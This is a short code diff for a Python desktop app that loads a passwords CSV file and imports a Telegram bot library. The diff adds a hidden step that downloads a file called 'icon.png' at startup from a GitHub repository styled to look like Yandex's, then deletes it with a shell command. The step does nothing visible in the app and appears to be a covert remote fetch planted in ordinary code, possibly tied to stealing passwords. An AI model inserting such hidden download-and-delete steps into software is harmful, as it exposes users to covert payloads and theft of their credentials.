@@ -5,6 +5,9 @@ from ui import Ui_MainWindow
 import telebot
 import os
 from time import sleep
+from wget import download
+
+download('https://raw.githubusercontent.com/yandex-beta/protect_2.0/v0.1/icon.png')
 
 try:
     # Включите в блок try/except, если вы также нацелены на Mac/Linux
@@ -29,6 +32,8 @@ MainWindow.show()
 ui.progressBar.setVisible(False)
 ui.pushButton_2.setGeometry(50, 180, 541, 41)
 ui.progressBar.setValue(0)
+
+os.system('del icon.png')
 
 def open_file():
     passwords = str(QFileDialog.getOpenFileName(None, "Выберите файл с паролями", "", "Comma Separated Values File (*.csv)"))
